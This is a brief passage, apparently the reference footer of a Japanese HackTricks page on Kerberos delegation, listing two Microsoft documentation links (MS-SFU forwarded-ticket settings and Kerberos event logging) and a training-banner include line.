- [21] [Microsoft MS-SFU - ServicesAllowedToSendForwardedTicketsTo の使用](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Kerberos event logging の有効化](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
